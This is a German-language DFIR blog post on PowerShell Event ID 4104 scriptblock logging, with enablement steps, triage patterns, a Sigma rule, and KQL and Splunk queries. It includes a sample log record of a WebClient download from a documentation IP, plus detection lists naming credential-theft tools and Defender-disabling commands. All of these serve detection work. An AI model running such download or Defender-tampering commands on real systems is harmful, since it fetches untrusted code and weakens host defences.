---
title: "PowerShell Event ID 4104 erklärt: Scriptblock-Logging für DFIR"
description: "Scriptblock-Logging ist Windows' nützlichste kostenlose defensive Kontrolle. Es zeichnet den vollständigen Skript-Body auf, einschließlich obfuskierter oder in-memory ausgeführter, unter Event 4104."
date: "2026-05-17"
---

Wenn PowerShell Scriptblock-Logging aktiviert ist, zeichnet die Engine den Body jedes Skripts auf, das ausgeführt wird. Interaktive Befehle, von der Disk geladene Skripte, alles, was durch `Invoke-Expression` oder `IEX` in den Speicher reflektiert wird. Der Record landet auf `Microsoft-Windows-PowerShell%4Operational.evtx` als Event-ID **4104**, "Creating Scriptblock text".

Wenn Sie kein EDR haben, ist das das Nächste, was Ihnen die Plattform an einem solchen gibt. Schalten Sie es ein. Die Kosten sind vernachlässigbar und der Vorteil ist alles, was PowerShell zu verbergen versucht.

## Was Sie bekommen

```xml
<Data Name="MessageNumber">1</Data>
<Data Name="MessageTotal">1</Data>
<Data Name="ScriptBlockText">$wc = New-Object Net.WebClient; $wc.DownloadString('http://203.0.113.5/a')</Data>
<Data Name="ScriptBlockId">{guid}</Data>
<Data Name="Path">C:\Users\alice\Downloads\setup.ps1</Data>
```

Für ein langes Skript teilt PowerShell den Body über mehrere 4104-Records auf, einen pro `MessageNumber`. Sie wieder zusammenzufügen ist essentiell. Fragmente sind leicht falsch zu lesen, und ein Angreifer, der von Scriptblock-Logging weiß, wird Zeilen absichtlich auffüllen, sodass eine teilweise Übereinstimmung über einen einzelnen Record harmlos aussieht.

## Wie man es einschaltet

`HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging = 1`. Oder die Group Policy unter *Computer Configuration / Administrative Templates / Windows Components / Windows PowerShell / Turn on PowerShell Script Block Logging*. Es gibt keine messbaren PowerShell-seitigen Kosten. Schalten Sie es überall ein.

Während Sie dabei sind, aktivieren Sie auch Module Logging und Transcription. Module Logging (4103) gibt Ihnen Pro-Aufruf-Parameterwerte. Transcription schreibt die gerenderte Konsolen-Session in eine Datei, die Sie versenden können. Jedes fängt ein anderes Stück. Keines ersetzt 4104.

## Was 4104 fängt, was nichts anderes tut

Die PowerShell-Engine loggt das Skript *nach* jedem Encoding, Compression oder In-Memory-Reflection. Das bedeutet:

- Ein `-EncodedCommand`-Aufruf loggt sowohl den codierten Launcher (im entsprechenden [4688](/en/blog/event-id-4688-process-creation) oder [Sysmon 1](/en/blog/sysmon-event-id-1-process-create)) als auch den dekodierten Body (in 4104).
- Ein Skript, das einen Remote-Payload herunterlädt und `Invoke-Expression`s, loggt den *ausgeführten* Body, nicht den Wrapper.
- Ein Angreifer, der AMSI-Bypasses verwendet, hinterlässt immer noch den 4104-Record. Der Bypass beeinflusst Scanning, nicht Logging. Der Bypass selbst zeigt sich oft als 4104-Zeilen mit `amsiInitFailed` oder `amsiScanBuffer`.

Das ist die einzige nützlichste kostenlose defensive Kontrolle auf der Plattform. Verteidiger, die kein EDR haben, haben das üblicherweise.

## 4104 im Maßstab triagieren

Die hochwertigen Muster in einem Korpus von 4104-Records:

- `DownloadString`, `DownloadFile`, `Invoke-WebRequest`, `Net.WebClient`. Remote-Content-Fetch.
- `IEX`, `Invoke-Expression`. Dynamische Ausführung.
- `FromBase64String`, `[System.Convert]::FromBase64String`. Codierter Payload.
- `Add-MpPreference -ExclusionPath`. Defender-Tampering.
- `Set-MpPreference -DisableRealtimeMonitoring`. Defender-Tampering.
- `[System.Reflection.Assembly]::Load`, `[Reflection.Emit]`. In-Memory-Assembly-Loading.
- `Invoke-Mimikatz`, `Invoke-Kerberoast`, `Invoke-BloodHound`, `DCSync`. Bekanntes offensives Tooling.

Eine einzelne Übereinstimmung allein ist nicht immer bösartig (Admins verwenden `DownloadString` auch). Die Kombinationen sind es. Pivotieren Sie von 4104 zum passenden [Sysmon-Event 1](/en/blog/sysmon-event-id-1-process-create) oder [4688](/en/blog/event-id-4688-process-creation) per Zeitstempel + Prozess, um den vollständigen Aufrufkontext wiederherzustellen.

## Sigma: offensives PowerShell-Tooling

```yaml
title: Suspicious PowerShell Scriptblock - Offensive Tool Indicators
id: 4f1a3b8d-2c5e-4d8f-9a3b-1c2d3e4f5a6b
status: stable
description: PowerShell scriptblock body contains strings characteristic of offensive tooling, encoded payloads, or in-memory reflection.
references:
  - https://attack.mitre.org/techniques/T1059/001/
  - https://attack.mitre.org/techniques/T1027/
logsource:
  product: windows
  service: powershell
  category: ps_script
detection:
  selection_offensive:
    EventID: 4104
    ScriptBlockText|contains:
      - 'Invoke-Mimikatz'
      - 'Invoke-Kerberoast'
      - 'Invoke-BloodHound'
      - 'Invoke-DCSync'
      - 'New-PSInjection'
      - 'Get-PassHashes'
  selection_reflective:
    EventID: 4104
    ScriptBlockText|contains:
      - 'System.Reflection.Assembly]::Load'
      - '[Reflection.Emit]'
      - 'FromBase64String'
  selection_defender_tamper:
    EventID: 4104
    ScriptBlockText|contains:
      - 'Set-MpPreference -DisableRealtimeMonitoring'
      - 'Add-MpPreference -ExclusionPath'
      - 'Set-MpPreference -DisableIOAVProtection'
  condition: selection_offensive or selection_reflective or selection_defender_tamper
falsepositives:
  - Defenders running known offensive tooling for testing (whitelist by host)
  - Software installers using reflection for legitimate purposes
level: high
tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense_evasion
```

## KQL: codiertes PowerShell von einem niedrig-privilegierten Benutzer

```kusto
let encoded =
    Event
    | where Source == "Microsoft-Windows-PowerShell" and EventID == 4104
    | extend XmlData = parse_xml(EventData)
    | extend ScriptBlockText = tostring(XmlData.EventData.Data[2])
    | where ScriptBlockText contains "FromBase64String"
       or ScriptBlockText matches regex @"\b-e(?:nc|ncodedcommand)?\b\s"
    | project TimeGenerated, Computer, UserId=tostring(XmlData.System.Security["@UserID"]), ScriptBlockText;
encoded
| where UserId !startswith "S-1-5-18"   // exclude LocalSystem
   and UserId !startswith "S-1-5-19"
   and UserId !startswith "S-1-5-20"
| order by TimeGenerated desc
```

## Splunk: Defender-Tampering aus PowerShell

```spl
index=powershell EventCode=4104
   ( ScriptBlockText="*Set-MpPreference*DisableRealtimeMonitoring*"
     OR ScriptBlockText="*Add-MpPreference*ExclusionPath*"
     OR ScriptBlockText="*Set-MpPreference*DisableIOAVProtection*" )
| table _time host UserID ScriptBlockText
```

## ATT&CK-Zuordnung

- T1059.001 Command and Scripting Interpreter: PowerShell. Jedes offensive 4104 wird hier abgebildet. PowerShell ist eine der meistzitierten Ausführungstechniken in modernen Intrusions.
- T1027 Obfuscated Files or Information. Encoded-, Base64-, `FromBase64String`-Muster.
- T1140 Deobfuscate/Decode Files or Information. Die Engine loggt die *dekodierte* Form, was der Wert ist, den 4104 über [4688](/en/blog/event-id-4688-process-creation) hinaus bietet.
- T1562.001 Impair Defenses: Disable or Modify Tools. `Set-MpPreference -DisableRealtimeMonitoring`, `Add-MpPreference -ExclusionPath`.
- T1003.001 LSASS Memory. `Invoke-Mimikatz`, `MiniDump`, `comsvcs.dll`-Muster in Skript-Bodies.
- T1558.003 Kerberoasting. `Invoke-Kerberoast`, Rubeus Kerberoast-Muster.

## Falschpositive, die genau wie Angriffe aussehen

- Admin-Runbooks verwenden manchmal `Invoke-Expression` legitim für templatisierte Konfiguration. Die Kombination ist üblicherweise kurz, wiederholbar und aus bekannten Admin-Sessions.
- Defender-Management-Skripte (Unternehmens-IT) rufen `Set-MpPreference` legitim auf, um Ausschlusslisten zu pushen. Whitelisten nach dem Signing-Zertifikat oder Host-SID des Skripts.
- Chocolatey, WinGet, Paket-Installer verwenden Base64-codiertes PowerShell legitim. Muster: kurz, tagsüber, von Build- oder Admin-Hosts.
- Red-Team- oder Pentest-Aktivität sieht identisch wie echte Angriffe aus. Koordinieren Sie Engagement-Fenster und taggen Sie Operator-Quell-IPs.

## Der blinde Fleck

4104 loggt den *Body* des Skripts. Es loggt keine Pro-Statement-Ausführung, Funktionsrückgaben oder Variablenwerte. Dafür brauchen Sie 4103 (Module Logging) oder ein echtes EDR. 4104 sagt Ihnen, was lief. Der Rest sagt Ihnen, was es tat.

Wenn 4104 zum Zeitpunkt des Angriffs aus war (der häufigste Fall, den ich in Vorfällen auf veralteten Beständen sehe), ist der Skript-Body weg. Der Wrapper-Aufruf könnte noch in [4688](/en/blog/event-id-4688-process-creation) sein, der Binär-Stempel in [AmCache](https://www.amcacheparser.com) und das Arbeitsverzeichnis in [Prefetch](https://www.prefetchparser.com), aber der tatsächliche Code ist verloren, es sei denn, Sie können ihn aus [pagefile.sys](https://www.pagefilesysparser.com) oder einem [RAM-Dump](https://www.ramparser.com) carven. Schalten Sie es jetzt ein, damit Sie sich das nächste Mal nicht selbst diesen Streit liefern müssen.

## Weiterführende Literatur

- [Microsoft-Dokumentation: PowerShell Scriptblock Logging](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows)
- [FireEye/Mandiant: Greater Visibility Through PowerShell Logging](https://www.mandiant.com/resources/blog/greater-visibility)
- [Daniel Bohannon: Invoke-Obfuscation und Detection](https://github.com/danielbohannon/Invoke-Obfuscation)
